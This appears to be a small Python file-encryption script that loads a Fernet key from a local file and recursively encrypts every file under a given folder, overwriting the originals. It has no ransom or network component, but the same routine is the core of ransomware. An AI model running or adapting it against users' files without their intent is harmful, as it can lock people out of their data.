from cryptography.fernet import Fernet
import os

def encrypt(filename):
    
    fernet = Fernet(key)

    with open(filename,'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(filename,'wb') as encrypted_file:
        encrypted_file.write(encrypted)


def inside_folder(folder_path):
    for filename in os.listdir(folder_path):
        full_path = os.path.join(folder_path,filename)
        if(os.path.isdir(full_path)):
            inside_folder(full_path)
        else:
            print("Encrypting...", filename)
            encrypt(full_path)
            print("Done")


def main_encrypt(path):
    with open('filekey.key','rb') as filekey:
            global key 
            key = filekey.read()

    folder_path = path

    if(os.path.isfile(folder_path)):
        print("Encrypting...",folder_path)
        encrypt(folder_path)
        print("Done")

        exit(1)
    inside_folder(folder_path)